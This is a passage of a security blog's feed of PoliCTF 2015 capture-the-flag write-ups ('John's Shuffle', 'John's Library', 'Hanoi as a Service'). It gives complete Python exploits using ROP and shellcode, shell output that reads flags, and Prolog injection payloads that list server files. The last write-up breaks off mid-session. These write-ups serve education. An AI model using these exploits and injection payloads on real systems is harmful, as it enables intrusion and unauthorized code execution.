<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;shuffle.polictf.it&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">rop</span> <span class="o">=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048696</span><span class="p">)</span>  <span class="c"># resolve -&gt; read (so we can read in `/bin/sh`)</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804901d</span><span class="p">)</span> <span class="c"># pppr</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># stdin</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="c"># free mem area</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048726</span><span class="p">)</span> <span class="c"># resolve -&gt; system</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048746</span><span class="p">)</span> <span class="c"># resolve -&gt; exit (makes rasta_mouse happy!)</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="c"># arg for system; will contain /bin/sh in a few moments</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-shuffle<span class="nv">$ </span>python poc.py
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span>
</span><span class='line'>cat /home/ctf/*
</span><span class='line'>flag<span class="o">{</span>rand0mizing_things_with_l0ve<span class="o">}</span>
</span><span class='line'>cat: /home/ctf/johnshuffle: Permission denied
</span></code></pre></td></tr></table></div></figure>


<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Library]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library/"/>
    <updated>2015-07-12T16:45:04+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library</id>
    <content type="html"><![CDATA[<p>Finally, pwnables! John&rsquo;s Library was worth 150 points. I was a bit rusty but I managed to grab this flag.</p>

<!--more-->


<p>We&rsquo;re given a 32 bit Linux ELF. Upon running it, we&rsquo;re presented with a library menu, where we can view titles, add them and exit the program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the jungle library mate! Try to escape!!
</span><span class='line'>
</span><span class='line'> r - <span class="nb">read </span>from library
</span><span class='line'> a - add element
</span><span class='line'> u - <span class="nb">exit</span>
</span><span class='line'>a
</span><span class='line'>Hey mate! Insert how long is the book title:
</span><span class='line'>10000
</span><span class='line'>Hey you! what are you trying to <span class="k">do</span>??
</span></code></pre></td></tr></table></div></figure>


<p>So we can&rsquo;t really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the <code>.data</code> of the binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048731: mov    eax,DWORD PTR <span class="o">[</span>eax*4+0x804a060<span class="o">]</span> <span class="p">;</span> 0x804a060 contains lengths
</span><span class='line'> 8048738: mov    edx,eax
</span><span class='line'> 804873a: mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>         <span class="p">;</span> ptr to first book
</span><span class='line'> 804873d: add    eax,edx                         <span class="p">;</span> add length of last string to it
</span><span class='line'> 804873f: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048742: call   <span class="m">8048410</span> &lt;gets@plt&gt;              <span class="p">;</span> grab book title
</span></code></pre></td></tr></table></div></figure>


<p>I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of <code>main()</code> on the stack. Although NX wasn&rsquo;t enabled, ASLR was enabled so we couldn&rsquo;t just jump to the shellcode on the stack. There weren&rsquo;t enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn&rsquo;t work). That&rsquo;s where the read function came into play.</p>

<p>Looking up a book title via the read function was done like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048678: mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>         <span class="p">;</span> number we just submitted
</span><span class='line'> 804867b: mov    eax,DWORD PTR <span class="o">[</span>eax*4+0x804a060<span class="o">]</span> <span class="p">;</span> grab length of that book title
</span><span class='line'> 8048682: mov    edx,eax
</span><span class='line'> 8048684: mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>         <span class="p">;</span> pointer to book titles on stack
</span><span class='line'> 8048687: add    eax,edx                         <span class="p">;</span> add length of string so eax points to book title
</span><span class='line'> 8048689: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 804868d: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048893
</span><span class='line'> 8048694: call   80483f0 &lt;<span class="nb">printf</span>@plt&gt;            <span class="p">;</span> dump title to user
</span></code></pre></td></tr></table></div></figure>


<p>By passing in a negative number, I was able to make <code>804867b: mov eax,DWORD PTR [eax*4+0x804a060]</code> point to <code>0x80493fc</code>, which contained <code>0xffffffe0</code>. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0xffffd1ab <span class="o">(</span>address of book titles on stack<span class="o">)</span> + <span class="nv">0xffffffe0</span> <span class="o">=</span>&gt;
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/10x <span class="nv">$eax</span>
</span><span class='line'>0xffffd18b:   0x048614-&gt;ff 0xffd1ab&lt;-08 0x000002ff  0x15fd7c00
</span><span class='line'>0xffffd19b:   0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
</span></code></pre></td></tr></table></div></figure>


<p>I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of <code>main()</code>. After setting all of this up, we&rsquo;d ask the binary to exit and make it return to our shellcode. Putting it all together:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;library.polictf.it&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># mem leak</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;read:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-793&#39;</span><span class="p">)</span>  
</span><span class='line'>  <span class="c"># -793*4 = 0xfffff39c; </span>
</span><span class='line'>  <span class="c"># 0x804867b &lt;read_from_library+58&gt;:   mov eax,DWORD PTR [eax*4+0x804a060] </span>
</span><span class='line'>  <span class="c"># -&gt; 0x80493fc == 0xffffffe0</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># leak stack addr</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span><span class='line'>  <span class="n">stackaddr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">10</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stackaddr</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># 2**32 -&gt; integer overflow, </span>
</span><span class='line'>  <span class="c"># we now have plenty of space to overwrite the saved return address</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4294967296&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># the reason i divided the nop sled is simple; for some reason, when the shellcode executes, </span>
</span><span class='line'>  <span class="c"># it overwrites itself if it&#39;s at the end. this solves it; didn&#39;t debug it </span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30f</span><span class="o">-</span><span class="mi">37</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">stackaddr</span><span class="o">+</span><span class="mi">200</span><span class="p">))</span> <span class="c"># 0xffffd1ad -&gt; start of our buffer</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;u&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And running it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-library<span class="nv">$ </span>python sn0w.py
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /home/ctf
</span><span class='line'>ls
</span><span class='line'>challenge
</span><span class='line'>flag
</span><span class='line'>cat flag
</span><span class='line'>flag<span class="o">{</span>John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Hanoi as a Service]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/"/>
    <updated>2015-07-12T16:30:31+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service</id>
    <content type="html"><![CDATA[<p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>

<!--more-->


<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>
</span><span class='line'>ERROR: Prolog initialisation failed:
</span><span class='line'>ERROR: Syntax error: Unexpected end of clause
</span><span class='line'>ERROR: hanoi<span class="o">()</span>
</span><span class='line'>ERROR: ** here **
</span><span class='line'>ERROR: .
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, hanoi<span class="o">(</span>2<span class="o">)</span>.
</span><span class='line'>* Move top disk from a to c
</span><span class='line'>* Move top disk from a to b
</span><span class='line'>* Move top disk from c to b
</span></code></pre></td></tr></table></div></figure>


<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>.
</span><span class='line'><span class="o">[</span>/home/ctf,/home/ubuntu<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># enumerate /home/ctf:</span>
</span><span class='line'>
</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/ctf/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>. %
</span><span class='line'><span class="o">[</span>/home/ctf/haas<span class="o">]</span>bas@tritonal:~<span class="nv">$ </span>
</span><span class='line'>
</span><span class='line'><span class="c"># enumerate /home/ctf/haas:</span>
</span><span class='line'>
</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/ctf/haas/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>.
</span><span class='line'><span class="o">[</span>/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
